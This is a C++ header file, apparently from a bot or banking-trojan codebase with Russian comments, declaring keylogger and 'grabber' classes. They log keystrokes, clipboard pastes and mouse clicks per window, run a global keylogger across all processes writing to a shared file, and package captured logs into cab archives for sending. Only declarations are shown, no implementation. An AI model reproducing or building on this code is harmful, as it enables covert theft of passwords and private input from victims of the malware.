//---------------------------------------------------------------------------

#ifndef __KeyLoggerH
#define __KeyLoggerH
//---------------------------------------------------------------------------

#include <Windows.h>

#include "GetApi.h"
#include "Strings.h"
#include "BotClasses.h"



class TKeyLogger;
class TGrabber;





//********************************************************
//   TKeyLogger - Базовый класс келогера
//********************************************************
class TKeyLogger : public TEventContainer
{
private:

	typedef TEventContainer inherited;

	TGrabber* FGrabber;
public:
	TKeyLogger();
	virtual ~TKeyLogger();

	// Функция возвращает истину если к кейлогеру подключен грабер
	bool Active();

	// Функция записывает лог от клавиатуры
	bool LogKeyboard(HWND Wnd, const char* Text);

	// Функция логирует вставку из буфера обмена
	void LogClipboard(const char* Text);

	// функция логирует события мыши
	bool LogMouse(HWND Wnd, int X, int Y, int Button);


    bool ConnectGrabber(TGrabber* Grabber);
	bool DisconnectGrabber(TGrabber* Grabber);

	void CallEvent(int EventId, LPVOID Param); // Перекрытый метод
};




//********************************************************
//  TInfiniteKeyLogger - класс бесконечного логирования
//                       ввода с клавиатуры. Класс дейст-
//  твует глобально на все процессы. Данные пишутся в
//  общий текстовый файл.
//
//********************************************************
class TInfiniteKeyLogger : public TBotObject
{
private:
	string FSignalFile;
	string FDataFile;

	string static GetSignalFileName();
public:
	TInfiniteKeyLogger();
	~TInfiniteKeyLogger();

	//--------------------------------------------
	//  Activate - Функция активирует глобальный
	//             кейлогер
	//--------------------------------------------
	bool static Activate();

	//--------------------------------------------
	//  Activated - Функция возвращает истину если
	//             кейлогер активирован
	//--------------------------------------------
	bool static Activated();
};



//********************************************************
//  TGrabber - Базовый класс грабера
//********************************************************
class TGrabber : public TBotObject
{
private:
	string      FName;
	TKeyLogger* FKeyLogger;
	LPVOID      FCab;
	string      FCabFileName;

	friend class TKeyLogger;
protected:
	void virtual LogKeyboad(HWND Wnd, const char* Text) {  }
	void virtual LogClipboard(HWND Wnd, const char* Text);

	LPVOID OpenCab();
	void   CloseCab(bool SendLog);

	void virtual DoEvent(int EventId, LPVOID Param) { }
public:
	TGrabber(const string& GrabberName);
	~TGrabber();
	bool ConnectToKeyLogger();
	bool DisconnectFromKeyLogger();

	string inline Name() { return FName; }
};



//---------------------------------------------------------------------------
#endif
